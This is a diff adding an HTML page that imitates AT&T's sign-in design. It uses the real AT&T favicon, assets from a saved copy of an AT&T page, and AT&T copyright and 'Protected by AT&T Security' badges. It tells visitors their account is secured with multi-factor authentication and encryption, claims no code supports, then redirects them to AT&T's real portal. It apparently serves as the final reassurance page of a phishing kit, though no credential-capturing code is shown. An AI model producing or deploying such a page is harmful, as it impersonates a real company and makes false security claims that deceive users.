@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en" class="isPC isFirefox isLandscape">
+<head>
+  <meta charset="utf-8">
+  <title>Account Secured Successfully</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no">
+
+  <!-- Favicon + Styles -->
+  <link rel="icon" type="image/x-icon" href="https://signin.att.com/favicon.ico">
+  <link rel="stylesheet" href="At screen_files/styles.css">
+  
+  <!-- Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  
+  <style>
+    .security-icon {
+      font-size: 5rem;
+      color: #0073cf;
+      margin: 20px 0;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    .security-badge {
+      background-color: #f0f8ff;
+      border-radius: 12px;
+      padding: 15px;
+      margin: 20px 0;
+      border-left: 4px solid #0073cf;
+    }
+    .feature-list {
+      text-align: left;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+    .feature-item {
+      display: flex;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    .feature-icon {
+      color: #28a745;
+      margin-right: 10px;
+      font-size: 1.2rem;
+    }
+    
+    /* Professional Footer Styling */
+    .professional-footer {
+      text-align: center;
+      padding: 25px 20px;
+      margin-top: 40px;
+      background-color: #f8f9fa;
+      border-top: 1px solid #e0e0e0;
+      width: 100%;
+    }
+    
+    .footer-content {
+      max-width: 800px;
+      margin: 0 auto;
+    }
+    
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 20px;
+      margin-bottom: 15px;
+    }
+    
+    .footer-links a {
+      color: #0073cf;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 13px;
+      transition: color 0.2s ease;
+      white-space: nowrap;
+    }
+    
+    .footer-links a:hover {
+      color: #0056b3;
+      text-decoration: underline;
+    }
+    
+    .copyright {
+      font-weight: 600;
+      color: #666;
+      font-size: 13px;
+      margin-top: 8px;
+    }
+    
+    .security-badge-footer {
+      display: inline-flex;
+      align-items: center;
+      background: #e8f4ff;
+      padding: 8px 16px;
+      border-radius: 20px;
+      margin-top: 15px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #0073cf;
+    }
+    
+    .security-badge-footer i {
+      margin-right: 6px;
+      font-size: 14px;
+    }
+    
+    /* Responsive adjustments */
+    @media (max-width: 768px) {
+      .footer-links {
+        gap: 15px;
+      }
+      
+      .footer-links a {
+        font-size: 12px;
+      }
+      
+      .professional-footer {
+        padding: 20px 15px;
+      }
+      
+      .security-icon {
+        font-size: 4rem;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .footer-links {
+        flex-direction: column;
+        gap: 10px;
+      }
+      
+      .footer-links a {
+        padding: 5px 0;
+      }
+      
+      .copyright {
+        font-size: 12px;
+      }
+      
+      .security-icon {
+        font-size: 3.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div id="app-root">
+    <div id="appCompBackground" class="full-width-background bg-white">
+      <div id="appCompContainer" class="container full-height flex flex-column">
+        <div id="appCompCardContainer" class="row justify-center flex-1">
+          <div id="appCompCardContDiv">
+            <app-card role="main">
+              <div class="card rel z0 flex flex-column no-border-sm radius-lg mar-t-xl-lg border-shadow login-card">
+                <div class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
+
+                  <!-- Header -->
+                  <app-header class="flex-container">
+                    <img src="At screen_files/att_hz_lg_lkp_rgb_pos.svg" alt="Logo" class="header-logo-image mar-b-md-all">
+                    
+                    <!-- Security Icon -->
+                    <div class="text-center">
+                      <i class="fas fa-shield-check security-icon"></i>
+                    </div>
+                    
+                    <div class="mar-b-md-all text-center">
+                      <h1 class="heading-lg">Account Successfully Secured</h1>
+                      <h2 class="heading-md mar-t-xxs-lg" style="color: #28a745;">Your information is now protected</h2>
+                    </div>
+                  </app-header>
+
+                  <!-- Security Message -->
+                  <div class="security-badge">
+                    <p class="text-center" style="font-weight: 500;">
+                      <i class="fas fa-check-circle" style="color: #28a745;"></i>
+                      Your account verification is complete and your data is protected with advanced security measures.
+                    </p>
+                  </div>
+
+                  <!-- Security Features -->
+                  <div class="feature-list">
+                    <div class="feature-item">
+                      <i class="fas fa-lock feature-icon"></i>
+                      <span>Multi-factor authentication enabled</span>
+                    </div>
+                    <div class="feature-item">
+                      <i class="fas fa-shield-alt feature-icon"></i>
+                      <span>Advanced encryption activated</span>
+                    </div>
+                    <div class="feature-item">
+                      <i class="fas fa-check-circle feature-icon"></i>
+                      <span>Account details up to date</span>
+                    </div>
+                  </div>
+
+                  <!-- Redirect button -->
+                  <div class="continue-button-spacing mar-t-lg">
+                    <button id="redirectBtn" class="btn-full-width btn-primary letter-spacing-3">
+                     Continue to Account
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </app-card>
+          </div>
+        </div>
+
+        <!-- Professional Footer -->
+        <div class="professional-footer">
+          <div class="footer-content">
+            <div class="footer-links">
+              <a href="#">Privacy Policy</a>
+              <a href="#">Terms of Use</a>
+              <a href="#">Accessibility</a>
+              <a href="#">Your Privacy Choices</a>
+              <a href="#">Legal Policy Center</a>
+            </div>
+            <div class="copyright">
+              © 2025 AT&T Intellectual Property. All rights reserved.
+            </div>
+            <div class="security-badge-footer">
+              <i class="fas fa-shield-alt"></i>
+              Secure Login • Protected by AT&T Security
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("redirectBtn").addEventListener("click", function() {
+      window.location.href = "https://currently.att.yahoo.com/"; // change destination if needed
+    });
+    
+    // Add slight delay for a more satisfying user experience
+    setTimeout(function() {
+      document.querySelector('.security-icon').style.animation = 'none';
+      setTimeout(function() {
+        document.querySelector('.security-icon').style.animation = 'pulse 2s infinite';
+      }, 10);
+    }, 2000);
+  </script>
+</body>
+</html>
